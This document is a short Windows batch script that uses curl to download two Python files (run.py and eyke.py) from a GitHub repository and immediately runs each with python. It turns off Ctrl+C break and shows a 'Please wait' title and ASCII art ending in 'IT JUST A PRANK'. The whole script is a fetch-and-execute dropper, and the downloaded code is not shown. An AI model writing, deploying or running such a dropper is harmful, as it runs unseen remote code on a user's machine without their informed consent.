@echo off
title Please wait - Script Running
setlocal ENABLEEXTENSIONS
break off

echo Downloading script from GitHub...

REM Download run.py
curl -o run.py https://raw.githubusercontent.com/RaAlpha168/Python/main/run.py

echo Running the Python script...
python run.py

REM Delay for 10 seconds
timeout /t 10 /nobreak >nul

echo "   /|\       /|     /|  /|\   /|    /|   /|/|   /|\         /|\                /|\   /|\   /| |\   /|\   /|\   /|\   /|\  "
echo "    |       / |    / |   |   / |    |   |     / | |         |                  /   \ /   \  | | |  |     |     |     |    "
echo "    |      /__|   /__|   |  /__|    |   |\|  /__| |         |                  \    |\    \ | | |  |     |     |     |    "
echo "    |     /   |  /   |   | /   |    |   |    /   | |        |                   \   | \   | | | |  |     |     |     |    "
echo "   /|\   /    | /    |  /|/    |   /|\  |   /    | |       /|\                   \_/   \_/  |_|_|   \_/  \_/   \_/   \_/  "
echo "    |  " 
echo "                                           IT JUST A PRANK                  " 

REM Download eyke.py
curl -o eyke.py https://raw.githubusercontent.com/RaAlpha168/Python/main/eyke.py

echo Running eyke.py...
python eyke.py

echo Script execution completed.
pause >nul
goto :eof
